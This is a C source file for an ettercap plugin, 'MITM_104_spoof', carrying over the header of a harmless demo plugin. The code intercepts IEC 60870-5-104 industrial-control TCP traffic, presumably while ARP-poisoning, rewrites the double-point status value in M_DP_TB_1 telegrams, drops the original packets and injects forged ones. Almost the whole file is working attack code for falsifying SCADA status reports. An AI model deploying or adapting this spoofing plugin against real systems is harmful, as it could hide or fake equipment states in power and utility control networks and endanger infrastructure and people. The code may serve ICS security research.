/*

    dummy -- ettercap plugin -- it does nothig !

                                only demostrates how to write a plugin !

    Copyright (C) ALoR & NaGA
  
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.

*/


#include <ec.h>                        /* required for global variables */
#include <ec_plugins.h>                /* required for plugin ops */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ec_packet.h>
#include <ec_hook.h>
#include <ec_send.h>
#include <ec_session_tcp.h>

/* Comment out if you want to use one octet for the Common address of ASDU */

#define ADDR_TWO_OCTECTS 0;

enum {I_FORMAT, S_FORMAT, U_FORMAT};

/* IEC 60870-5-104 protocol start byte (0x68) */

u_char START = 0x68;

/* In this example we are only interested in modifying ASDU process telegrams with long time tag (7 octets).
   Specifically double point information with time tag CP56Time2a (M_DP_TB_1)
   To modify other IEC 104 packets, this ASDU value must be edited to the appropriate hexadecimal value.
*/
u_char M_DP_TB_1 = 0X1f;

/* In this example we are only interested in modifying APCI packets that have the I-format (0x00).
   To modify other APCI types, the control bytes in the structure should be edited following
   the data stream of the packet on a packet analyzer (ex: Wireshark)
*/
struct apci_header {
  u_char start;		//Start byte
  u_int8 length;	//APDU Length
  u_int8 control_f_1;	//Type (can be: I=LSB is 0; S=LSBs are 01; U=LSBs are 11) and Send sequence no.
  u_int8 control_f_2;	//Send sequence no. cont.
  u_int8 control_f_3;	//Receive sequence no.
  u_int8 control_f_4;	//Receive sequence no. cont.
};

/* This structure also corresponds to M_DP_TB_1 packets.
   To modify other IEC 104 packets, the ASDU information in the structure should be edited following
   the data stream of the packet on a packet analyzer (ex: Wireshark)
*/
struct asdu_header {
  u_char type_id;		//1 to 21; 30 to 40; 45 to 51; 58 to 64; 70; 100 to 107; 110 to 113; 120 to 127 (see IEC 104 documentation)
  
  //Data Unit Identifier
  u_char num_objects : 7;	//Number of objects
  u_char sq : 1;		//Structure qualifier
  u_char COT: 6;		//Cause of transmission
  u_char PN : 1;		//Positive/Negative
  u_char T : 1;			//Test bit
  #ifdef ADDR_TWO_OCTECTS
    short originator_addr;	//Originator address
  #else 
    u_char originator_addr;	//1 – 65 534 
  #endif
  
  /*--------------------------------------------------------------------*/
  //Information Object 1 (out of N)
  u_int IOA : 16; 		//8, 16 or 24 bits
  u_char spacer;
  
  //In this example DIQ is used, this only applies to DIQ information elements
  u_char dpi : 2;		//Double Point Information 
  u_char blank : 2;		//spacers
  u_char bl : 1;		//Not Blocked/Blocked
  u_char sb : 1;		//Not Substituted/Substetuted
  u_char nt : 1;		//Topical/Not Topical
  u_char iv : 1;		//Valid/Invalid
  
  //CP56Time2a time tag information
  u_int ms : 16;		//Miliseconds
  u_char min : 6;		//Minutes
  u_char blank1 : 1;		
  u_char IV : 1;		//Valid/Invalid
  u_char hour : 5;		//Hours
  u_char blank2 : 2;		
  u_char su : 1;		//Summer/Winter time
  u_char day : 5;		//Calender day
  u_char dow : 3;		//Day of the Week
  u_char month : 4;		//Month
  u_char year : 7;		//Year
};

/* prototypes is required for -Wmissing-prototypes */

/* 
 * this function must be present.
 * it is the entry point of the plugin 
 */
int plugin_load(void *);

/* additional functions */
static int MITM_104_spoof_init(void *);
static int MITM_104_spoof_fini(void *);
static void parse_tcp(struct packet_object *po);
static int get_type(u_int8 control);
static void print_apci(struct apci_header *apci);
static void print_asdu(struct asdu_header *asdu);

/* plugin operations */

struct plugin_ops MITM_104_spoof_ops = { 
   /* ettercap version MUST be the global EC_VERSION */
   .ettercap_version =  EC_VERSION,                        
   /* the name of the plugin */
   .name =              "MITM_104_spoof",  
    /* a short description of the plugin (max 50 chars) */                    
   .info =              "Spoofs IEC 104 Reply Packets",  
   /* the plugin version. */ 
   .version =           "1.0",   
   /* activation function */
   .init =              &MITM_104_spoof_init,
   /* deactivation function */                     
   .fini =              &MITM_104_spoof_fini,
};

/**********************************************************/

/* this function is called on plugin load */
int plugin_load(void *handle) 
{
   DEBUG_MSG("MITM 104 spoof plugin load function.");
   /*
    *  in this fuction we MUST call the registration procedure that will set
    *  up the plugin according to the plugin_ops structure.
    *  the returned value MUST be the same as plugin_register()
    *  the opaque pointer params MUST be passed to plugin_register()
    */
   return plugin_register(handle, &MITM_104_spoof_ops);
}

/*********************************************************/

static int MITM_104_spoof_init(void *dummy) 
{
   /* the control is given to this function
    * and ettercap is suspended until its return.
    * 
    * you can create a thread and return immediately
    * and then kill it in the fini function.
    *
    * you can also set an hook point with
    * hook_add(), in this case you have to set the
    * plugin type to PL_HOOK.
    */

   USER_MSG("MITM 104 spoof: Plugin running...\n");

   /* For UDP packets, change HOOK_PACKET_TCP to HOOK_PACKET_UDP */
   hook_add(HOOK_PACKET_TCP, &parse_tcp);
   
   /* return PLUGIN_FINISHED if the plugin has terminated
    * its execution.
    * return PLUGIN_RUNNING if it has spawned a thread or it
    * is hooked to an ettercap hookpoint and
    * it needs to be deactivated with the fini method.
    */
   return PLUGIN_RUNNING;
}

static int MITM_104_spoof_fini(void *dummy) 
{
   /* 
    * called to terminate a plugin.
    * usually to kill threads created in the 
    * init function or to remove hook added 
    * previously.
    */
   USER_MSG("MITM 104 spoof: Plugin finalization.\n");

   /* For UDP packets, change HOOK_PACKET_TCP to HOOK_PACKET_UDP */
   hook_del(HOOK_PACKET_TCP, &parse_tcp); 

   return PLUGIN_FINISHED;
}

static void parse_tcp(struct packet_object *po)
{
	
  /* don't show packets while operating */
  EC_GBL_OPTIONS->quiet = 1;

  struct apci_header *apci;
  struct asdu_header *asdu;
  apci = (struct apci_header *)po->DATA.data;
  asdu = (struct asdu_header *)(apci + 1);

  /* We are interested in monitoring packets of type M_SP_TB_1 have the I format*/
  if(START == apci->start && I_FORMAT == get_type(apci->control_f_1) && M_DP_TB_1 == asdu->type_id) {

    /* Debug message for original packet */
    USER_MSG("=========================");
    USER_MSG("\nOld Packet\n");
    print_apci(apci);
    print_asdu(asdu);
    USER_MSG("=========================\n");
    
    /* We can't inject in unoffensive mode or in bridge mode or while the read flag (prevents the LAN from being 
       scanned) is active. 
    */
    //Debug
    //USER_MSG("unoffensive:%d\n read:%d\n iface_bridge:%d\n", EC_GBL_OPTIONS->unoffensive, EC_GBL_OPTIONS->read, EC_GBL_OPTIONS->iface_bridge);
    if (EC_GBL_OPTIONS->unoffensive || EC_GBL_OPTIONS->read || (EC_GBL_OPTIONS->iface_bridge && EC_GBL_OPTIONS->iface_bridge<1000 && EC_GBL_OPTIONS->iface_bridge>0)) {
      USER_MSG("\n[!!] We can't inject in unoffensive mode or in bridge mode.\n");
      return E_INVALID;
    }

	
    /* Prevent the packet being sent */
    po->flags ^= PO_DROPPED;
	
    /* Modify the value */
    asdu->dpi = 1;
	
    /* UDP requires destination mac address. As we are ARP poisoning, the original mac address must be copied
       from a packet dissector to the packet destination.
       [!]Comment lines for TCP
    */
    //po->L2.dst[0] = 0xXX;
    //po->L2.dst[1] = 0xXX;
    //po->L2.dst[2] = 0xXX;
    //po->L2.dst[3] = 0xXX;
    //po->L2.dst[4] = 0xXX;
    //po->L2.dst[5] = 0xXX;
	
    /* Copy information to original structure */
    memcpy(po->DATA.data, apci, sizeof(apci));
    memcpy(po->DATA.data + sizeof(struct apci_header), asdu, sizeof(asdu));

    /* Debug message for altered packet */
    USER_MSG("=========================");
    USER_MSG("\nNew Packet\n");
    print_apci(apci);
    print_asdu(asdu);
    USER_MSG("=========================\n");

    /* Send modified packet (UDP)*/
	//Send function args
	//int 	send_udp (struct ip_addr *sip, struct ip_addr *tip, u_int8 *tmac, u_int16 sport, u_int16 dport, u_int8 *payload, size_t length)
	//DEBUG message
    //USER_MSG("po->L2.flags:%x, po->L2.flags:%x,po->L4.src:%x, po->L4.dst:%x\n", po->L2.dst[0], po->L2.dst[1], po->L4.src, po->L4.dst);
	//Send function
    //send_udp(&po->L3.src, &po->L3.dst, po->L2.dst, po->L4.src, po->L4.dst, po->DATA.data, po->DATA.disp_len);


    /* Send modified packet (TCP)*/
	//Send funtion args
	//int 	send_tcp (struct ip_addr *sip, struct ip_addr *tip, u_int16 sport, u_int16 dport, u_int32 seq, u_int32 ack, u_int8 flags, u_int8 *payload, size_t length)
	//DEBUG message
    //USER_MSG("po->L4.seq:%lu ,po->L4.ack: %lu, TH_ACK: %d, po->DATA.disp_len: %d\n",po->L4.seq, po->L4.ack, TH_PSH|TH_ACK, po->DATA.disp_len );
	//Send function
    send_tcp(&po->L3.src, &po->L3.dst, po->L4.src, po->L4.dst, po->L4.seq, po->L4.ack, TH_PSH|TH_ACK, po->DATA.data,po->DATA.disp_len );
  
    /*	The packet object struct has 4 layers, but only 3 of them are relevant in this case:
	L2 - Eth;
	L3 - IP;
	L4 - TCP/UDP (It detects the protocol automatically).	
    */
  
  }
}

/* Read the two LSBs from from the control octet 1
   Return the packets format based on the values */
static int get_type(u_int8 control)
{
    int one = ((control & 1<<0)==0 ? false : true); 
    int two = ((control & 1<<1)==0 ? false : true);

    if(one == 0)
      return I_FORMAT;
    if(one == 1 & two == 0)
      return S_FORMAT;
    if(one == 1 & two == 1)
      return U_FORMAT;
    return -1;
}

/* Debug print messages */
static void print_apci(struct apci_header *apci)
{
  USER_MSG("\n[-] APCI\n[+] START: \t%x \n[+] Length: \t%d \n[+] Control 1: \t%x \n[+] Control 2: \t%x \n[+] Control 3: \t%x \n[+] Control 4: \t%x \n[+] Type: \t%d\n", 
      apci->start, apci->length, apci->control_f_1, apci->control_f_2, apci->control_f_3, apci->control_f_4, get_type(apci->control_f_1));
}

static void print_asdu(struct asdu_header *asdu)
{
  USER_MSG("\n[-] ASDU\n[+] TC:\t\t 0x%x <%d> \n[+] SQ:\t\t %x \n[+] COT:\t\t %d \n[+] PN:\t\t %x \n[+] T:\t\t %x \n[+] O-Addr:\t %d \n[+] IOA:\t %d \n", 
    asdu->type_id, asdu->type_id, asdu->sq, asdu->COT, asdu->PN, asdu->T, asdu->originator_addr, asdu->IOA);
  USER_MSG("\n[*] DPI: %d - BL: %d - SB: %d - NT: %d - IV: %d\n",
    asdu->dpi, asdu->bl, asdu->sb, asdu->nt, asdu->iv);
  USER_MSG("\n[*] MS: %d - MIN: %d - IV: %d - HOUR: %d - SU: %d - DAY: %d - DOW: %d - MONTH: %d - YEAR: %d\n",
	asdu->ms, asdu->min, asdu->IV, asdu->hour, asdu->su, asdu->day, asdu->dow, asdu->month, asdu->year);
}

/* EOF */

// vim:ts=3:expandtab
